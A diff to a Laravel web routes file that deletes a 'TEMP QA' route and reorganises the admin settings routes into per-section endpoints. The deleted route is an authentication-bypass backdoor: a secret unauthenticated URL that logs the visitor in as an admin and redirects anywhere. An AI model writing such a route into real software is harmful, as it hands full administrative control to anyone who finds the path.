@@ -1,12 +1,5 @@
 <?php
 
-// ==== TEMP QA (remove after use) ====
-\Illuminate\Support\Facades\Route::get('/zt-qa-login-q9X2vR7LpZ/{to?}', function ($to='admin/coupons') {
-    \Illuminate\Support\Facades\Auth::login(\App\Models\User::whereHas('role', fn($q)=>$q->whereIn('slug',['super-admin','admin']))->first());
-    return redirect('/'.$to);
-})->where('to','.*');
-// ==== END TEMP ====
-
 use App\Http\Controllers\ProfileController;
 use App\Http\Controllers\Admin\CategoryController;
 use App\Http\Controllers\Admin\ManufacturerController;
@@ -223,7 +216,9 @@ Route::middleware(['auth', 'verified', 'admin'])->prefix('admin')->name('admin.'
     Route::put('/content/{section}', [ContentController::class, 'update'])->name('content.update');
 
     Route::get('/settings', [SettingController::class, 'index'])->name('settings.index');
-    Route::put('/settings', [SettingController::class, 'update'])->name('settings.update');
+    Route::get('/settings/{section}', [SettingController::class, 'index'])->name('settings.show')->where('section', 'branding|email|store|payments');
+    Route::post('/settings/email', [SettingController::class, 'updateEmail'])->name('settings.email');
+    Route::post('/settings/store', [SettingController::class, 'updateStore'])->name('settings.store');
     Route::post('/settings/test-email', [SettingController::class, 'test'])->name('settings.test');
     Route::put('/settings/payments', [SettingController::class, 'updatePayments'])->name('settings.payments');
     Route::post('/settings/branding', [SettingController::class, 'updateBranding'])->name('settings.branding');
